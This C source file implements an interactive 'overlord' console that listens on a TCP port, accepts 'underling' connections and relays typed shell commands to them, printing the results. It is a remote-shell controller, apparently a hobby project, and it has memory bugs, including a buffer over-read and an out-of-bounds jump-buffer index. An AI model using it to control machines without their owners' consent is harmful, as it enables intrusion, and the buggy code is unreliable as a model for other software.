#include "util.h"
#include "overlist.h"

#define NUM_GROUPS 10

#define LOGIC_EXIT 0
#define LOGIC_DEFAULT 1
#define LOGIC_ORDER 2
#define LOGIC_MANAGE 3

#define WAIT_DEFAULT 0
#define WAIT_CONNECT 1
#define WAIT_NETWORK 2
#define WAIT_COMMAND 3

char *input;
char message[MAX_MESSAGE_LENGTH];
int sock;
client_list *underlings;
client_list *groups[NUM_GROUPS];
volatile sig_atomic_t logicState;
volatile sig_atomic_t waitState;
sigjmp_buf sigjmps[WAIT_COMMAND];

void cleanup() {
  if (input) {
    free(input);
  }

  if (underlings) {
    freeClientList(underlings);
  }

  if (sock >= 0) {
    close(sock);
  }
}

static void sighandler(int signo) {
  if (signo == SIGINT) {
    if (waitState == WAIT_COMMAND) {
      cleanup();
      exit(1);
    } else if (waitState == WAIT_NETWORK) {
      //printf("Writing sigint\n");
      char data = 3;
      write(sock, &data, MAX_MESSAGE_LENGTH);
      siglongjmp(sigjmps[WAIT_DEFAULT], 1);
    }

    siglongjmp(sigjmps[waitState], 1);
  }
}

int serverSocket(int port) {
  int sock = socket(AF_INET, SOCK_STREAM, 0);

  if (checkError(sock, "socket") < 0) {
    // error handling
    return -1;
  }

  int enable = 1;
  int sockoptStatus = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));

  if (checkError(sockoptStatus, "setsockopt") < 0) {
    return -1;
  }

  sockoptStatus = setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &enable, sizeof(enable));

  if (checkError(sockoptStatus, "setsockopt") < 0) {
    return -1;
  }
  
  struct sockaddr_in sock_struct;
  sock_struct.sin_family = AF_INET;
  sock_struct.sin_addr.s_addr = INADDR_ANY;
  sock_struct.sin_port = htons(port);

  int bindStatus = bind(sock, (struct sockaddr *) &sock_struct, sizeof(sock_struct));

  if (checkError(bindStatus, "bind") < 0) {
    // error handling
    return -1;
  }

  return sock;
}

int serverConnect(int sock) {
  int listenStatus = listen(sock, 1);

  if (checkError(listenStatus, "listen") < 0) {
    return -1;
  }

  if (sigsetjmp(sigjmps[WAIT_CONNECT], 1) != 0) {
    return -1;
  }

  struct sockaddr_in sock_struct;
  socklen_t sock_struct_len = sizeof(sock_struct);

  int connection = accept(sock, (struct sockaddr *) &sock_struct, &sock_struct_len);
  
  if (checkError(connection, "accept") < 0) {
    return -1;
  }

  printf("Connected to %s\n", inet_ntoa(sock_struct.sin_addr));

  return connection;
}

int main() {
  input = NULL;
  sock = -1;
  
  printf("Welcome, overlord.\n");
  printf("Type help for available commands.\n");

  underlings = newClientList();
  logicState = LOGIC_DEFAULT;
  waitState = WAIT_DEFAULT;
  signal(SIGINT, sighandler);
  
  int index = -1;

  while (sigsetjmp(sigjmps[WAIT_DEFAULT], 1) != 0);
  
	while (logicState) {
    switch (logicState) {
    case LOGIC_DEFAULT:
      waitState = WAIT_COMMAND;
      prompt(&input, "[DEFAULT]> ", 1);
      waitState = WAIT_DEFAULT;
      
      if (!input || equals(input, "exit")) {
        logicState = LOGIC_EXIT;
      } else if (equals(input, "help")) {
        printf("Type 'manage' to manage underlings.\n");
        printf("Type 'order' to give orders to underlings.\n");
        printf("Type 'exit' to exit.\n");
      } else if (equals(input, "order")) {
        logicState = LOGIC_ORDER;
      } else if (equals(input, "manage")) {
        logicState = LOGIC_MANAGE;
      } 

      break;

    case LOGIC_ORDER:
      if (!input) {
        logicState = LOGIC_DEFAULT;
        break;
      }
      
      if (underlings->size == 0) {
        printf("No underlings available.\n");
      } else if (index < 0 || index >= underlings->size) {
        printClientList(underlings);

        prompt(&input, "Enter underling ID: ", 0);
        sscanf(input, "%d", &index);

        if (index < 0 || index >= underlings->size) {
          printf("Invalid ID!\n");
        }
      } else {
        client_node *underling = underlings->list[index];
        printf("[OVERLORD] ");
        prompt(&input, underling->prefix, 0);
        
        if (equals(input, "exit")) {
          logicState = LOGIC_DEFAULT;
          index = -1;
        } else {
          strncpy(message, input, MAX_MESSAGE_LENGTH);

          // write command
          write(underling->sock, message, MAX_MESSAGE_LENGTH);

          waitState = WAIT_NETWORK;

          // read command output
          readMessage(underling->sock);

          // print command output
          printf("%s", message);
        
          // read next prompt
          readMessage(underling->sock);
          strcpy(underling->prefix, message);
        }
      }
      
      break;

    case LOGIC_MANAGE:
      waitState = WAIT_COMMAND;
      prompt(&input, "[MANAGE]> ", 1);
      waitState = WAIT_DEFAULT;

      if (!input || equals(input, "back")) {
        logicState = LOGIC_DEFAULT;
      } else if (equals(input, "help")) {
        printf("Type 'back' or Control-C to return to the default state.\n");
        printf("Type 'add' to add underlings.\n");
        printf("Type 'view' to see current underlings.\n");
        printf("Type 'remove' to remove underlings.\n");
      } else if (equals(input, "add")) {
        sock = -1;
        int port = -1;

        while (sock < 0) {
          waitState = WAIT_DEFAULT;
          prompt(&input, "Enter port to listen on (default 5001): ", 0);

          if (!input) {
            exit(1);
          }

          if (*input) {
            sscanf(input, "%d", &port);
      
            if (port < 0) {
              printf("Invalid port!\n");
              continue;
            }
          } else {
            port = PORT;
          }

          sock = serverSocket(port);
        }

        waitState = WAIT_CONNECT;
        printf("Waiting for underling to connect...\n");

        int connection = serverConnect(sock);
        close(sock);

        if (connection >= 0) {
          printf("Underling connected.\n");

          readMessage(connection);
          prompt(&input, "Enter a description for this underling: ", 0);

          addClientToList(underlings, connection, input, message);
        }
      } else if (equals(input, "remove")) {
        printClientList(underlings);
        
        int id = -1;

        prompt(&input, "Enter ID to remove: ", 0);

        sscanf(input, "%d", &id);

        if (id < 0 || id > underlings->size) {
          printf("Invalid ID!\n");
        } else {
          removeClientFromList(underlings, id);
        }
      } else if (equals(input, "view")) {
        printClientList(underlings);
      }
            
      break;

    default:

      break;
    }
	}
  
	return 0;
}
